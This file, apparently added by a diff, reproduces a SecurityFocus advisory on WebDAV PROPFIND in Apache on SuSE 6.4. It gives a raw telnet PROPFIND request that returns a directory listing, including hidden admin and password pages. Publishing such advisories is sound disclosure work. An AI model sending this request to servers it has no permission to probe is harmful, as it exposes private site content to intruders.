@@ -1,0 +1,125 @@
+source: http://www.securityfocus.com/bid/1656/info
+
+WebDAV (Web Distributed Authoring and Versioning) is an extension of HTTP which allows users to create, edit and share documents using the HTTP protocol. A particular REQUEST METHOD, PROPFIND, allows users to retrieve resource properties such as displayname, date last modified, and others. Apache web server as installed by SuSE 6.4 has WebDAV enabled for the entire file structure of the server. By making a specific, properly structured request to the Apache web server, it is possible to obtain information which is equivalent to a directory listing.
+
+suse~: # telnet 127.0.0.1 80
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+PROPFIND / HTTP/1.1
+Host: suse
+Content-Type: text/xml
+Content-Length: 110
+
+<?xml version="1.0"?>
+<a:propfind xmlns:a="DAV:">
+<a:prop>
+<a:displayname/>
+</a:prop>
+</a:propfind>
+
+HTTP/1.1 207 Multi-Status
+Date: Sun, 20 Aug 2000 17:38:58 GMT
+Server: Apache/1.3.12 (Unix) (SuSE/Linux) mod_fastcgi/2.2.2 DAV/0.9.14
+mod_perl/1.21 PHP/3.0.15
+Transfer-Encoding: chunked
+Content-Type: text/xml; charset="utf-8"
+
+dc1
+<?xml version="1.0" encoding="utf-8"?>
+<D:multistatus xmlns:D="DAV:">
+<D:response>
+<D:href>/secret/secret/sql_tool.shtml</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/secret/secret/change-passwd.shtml</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/secret/secret/add-user.shmtl</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/secret/secret/</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/secret/</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/webalizer/</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/test.php3</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/date.php3</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/linbot/</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/robots.txt</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/index.html</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+<D:status>HTTP/1.1 200 OK</D:status>
+</D:propstat>
+</D:response>
+<D:response>
+<D:href>/gif/u_arrow.gif</D:href>
+<D:propstat>
+<D:prop>
+</D:prop>
+..
+- ---cut-----
